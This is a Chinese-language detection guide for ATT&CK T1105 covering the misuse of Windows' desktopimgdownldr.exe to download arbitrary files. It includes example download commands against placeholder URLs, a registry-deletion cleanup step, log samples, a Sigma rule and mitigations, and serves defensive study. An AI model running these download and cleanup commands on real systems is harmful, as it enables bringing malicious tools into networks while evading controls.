# T1105-Win-入口工具转移-desktopimgdownldr.exe(白名单)

## 描述

攻击者可能会将工具或其他文件从外部系统转移到被攻击的环境中。文件可以通过命令和控制通道从外部攻击者控制的系统复制，以将工具引入被攻击的网络中，也可通过其他工具（如FTP）或替代协议（如scp、rsync、sftp）在Mac和Linux上复制文件。

## 测试案例

`desktopimgdownldr.exe`是Windows 10系统中位于`C:\Windows\System32\`的内置工具，原本用于设置锁定屏幕或桌面背景图像。攻击者可利用其`/lockscreenurl`参数从远程URL下载任意文件。

### 路径
```bash
- C:\Windows\System32\desktopimgdownldr.exe
```

### 示例命令
- **普通用户下载文件**（无需管理员权限）：
  ```bash
  set "SYSTEMROOT=C:\ProgramData" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://url/xxx.exe /eventName:desktopimgdownldr
  ```
- **管理员下载并清理注册表**（包含注册表操作）：
  ```bash
  set "SYSTEMROOT=C:\ProgramData\" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://url/file.exe /eventName:desktopimgdownldr && reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP /f
  ```

### 用例
- 从Web服务器下载任意文件（如恶意可执行文件）。
- 所需权限：普通用户权限。
- 操作系统：Windows 10。

## 检测日志

### Windows安全日志
- **事件ID 4688**：记录`desktopimgdownldr.exe`进程创建及命令行参数（需启用命令行审核）。

### Sysmon日志
- **事件ID 1**：捕获`desktopimgdownldr.exe`进程创建及命令行参数。
- **事件ID 11**：记录文件创建事件，例如下载的文件存储路径（如`C:\Users\Username\AppData\Local\Temp\Personalization\LockScreenImage\`）。
  ```yml
  EventID: 11
  UtcTime: 2020-07-03 08:47:21.485
  ProcessGuid: {747F3D96-2178-5efe-0000-0010aada5800}
  ProcessId: 1556
  Image: C:\Windows\System32\svchost.exe
  TargetFilename: C:\Users\IEUser\AppData\Local\Temp\Personalization\LockScreenImage\LockScreenImage
  CreationUtcTime: 2020-07-03 08:47:21.485
  ```

### 网络日志
- 捕获`desktopimgdownldr.exe`发起的HTTP/HTTPS请求，检查目标URL是否异常。

## 测试复现

### 环境准备
- **靶机**：Windows 10。
- **权限**：普通用户权限（无需管理员）。
- **工具**：
  - `desktopimgdownldr.exe`（系统自带，路径`C:\Windows\System32\desktopimgdownldr.exe`）。
  - Sysmon（用于进程和文件监控）。
  - Wireshark（用于网络流量捕获）。
  - 测试Web服务器（提供可控URL）。
- **网络**：允许HTTPS出站流量，建议在隔离网络中测试。
- **日志**：启用Windows安全日志和Sysmon日志。

### 攻击步骤
1. **执行下载命令**：
   ```bash
   set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
   ```
   - 命令通过`lockscreenurl`参数从`https://domain.com:8080/file.ext`下载文件，保存至默认路径（如`C:\Users\Username\AppData\Local\Temp\Personalization\LockScreenImage\`）。
2. **验证结果**：
   - 检查下载文件是否生成于指定或默认路径。
   - 使用Wireshark捕获HTTP/HTTPS请求，确认目标URL。
3. **清理**：
   - 删除下载文件（如`del C:\Windows\Temp\file.ext`）。

## 测试留痕
以下为Windows安全日志示例（事件ID 4688）：
```yml
已创建新进程。

创建者主题:
安全 ID: DESKTOP-PT656L6\liyang
帐户名: liyang
帐户域: DESKTOP-PT656L6
登录 ID: 0x47126

目标主题:
安全 ID: NULL SID
帐户名: -
帐户域: -
登录 ID: 0x0

进程信息:
新进程 ID: 0x24a4
新进程名称: C:\Windows\System32\desktopimgdownldr.exe
令牌提升类型: %%1938
强制性标签: Mandatory Label\Medium Mandatory Level
创建者进程 ID: 0x2588
创建者进程名称: C:\Windows\System32\cmd.exe
进程命令行: desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
```

## 检测方法/思路

### Sigma规则
基于Sigma规则（`win_susp_desktopimgdownldr_file`），检测`desktopimgdownldr.exe`的异常文件创建行为：

```yml
title: Suspicious Desktopimgdownldr Target File
id: fc4f4817-0c53-4683-a4ee-b17a64bc1039
status: experimental
description: Detects a suspicious Microsoft desktopimgdownldr file creation that stores a file to a suspicious location or contains a file with a suspicious extension
author: Florian Roth
date: 2020/07/03
references:
  - https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/
  - https://twitter.com/SBousseaden/status/1278977301745741825
logsource:
  product: windows
  category: file_event
tags:
  - attack.defense_evasion
  - attack.t1105
detection:
  selection:
    Image|endswith: svchost.exe
    TargetFilename|contains: '\Personalization\LockScreenImage\'
  filter1:
    TargetFilename|contains: 'C:\Windows\'
  filter2:
    TargetFilename|contains:
      - '.jpg'
      - '.jpeg'
      - '.png'
  condition: selection and not filter1 and not filter2
fields:
  - CommandLine
  - ParentCommandLine
falsepositives:
  - False positives depend on scripts and administrative tools used in the monitored environment
level: high
```

### 检测思路
1. **进程监控**：
   - 检查`desktopimgdownldr.exe`的命令行参数是否包含`/lockscreenurl`和HTTP/HTTPS URL。
   - 监控异常父进程（如`cmd.exe`）。
2. **文件监控**：
   - 检测`desktopimgdownldr.exe`创建的文件是否位于非预期路径（如`C:\Users\Username\AppData\Local\Temp\Personalization\LockScreenImage\`）。
   - 识别非图像文件扩展名（如`.exe`、`.dll`）。
3. **网络监控**：
   - 捕获`desktopimgdownldr.exe`发起的HTTP/HTTPS请求，重点关注非微软官方URL。
4. **异常行为**：
   - 检测`desktopimgdownldr.exe`在非锁定屏幕更新场景下的运行。
5. **关联分析**：
   - 结合Sysmon事件ID 1（进程创建）和11（文件创建）进行关联，识别下载行为。

### 检测建议
- **告警规则**：基于Sigma规则，配置SIEM系统（如Splunk、Elastic）检测`desktopimgdownldr.exe`的异常参数和文件创建。
- **基线对比**：建立`desktopimgdownldr.exe`的正常使用基线（如更新锁定屏幕图像），排除合法行为。
- **网络白名单**：限制`desktopimgdownldr.exe`的出站流量，仅允许访问微软官方图像服务器。
- **文件完整性监控**：监控下载文件，检测非图像文件类型。

## 缓解措施
1. **限制网络访问**：
   - 配置防火墙，限制`desktopimgdownldr.exe`的出站HTTP/HTTPS流量，仅允许访问微软官方URL。
2. **加强日志监控**：
   - 启用命令行参数记录和Sysmon日志，覆盖进程和文件操作。
3. **白名单管理**：
   - 使用应用白名单工具（如AppLocker）限制`desktopimgdownldr.exe`的执行场景。
4. **用户权限管理**：
   - 限制普通用户修改锁定屏幕设置，需管理员审核。
5. **定期审查**：
   - 检查系统内`desktopimgdownldr.exe`的异常使用记录，结合威胁情报分析风险。

## 参考推荐
- MITRE ATT&CK T1105  
  https://attack.mitre.org/techniques/T1105
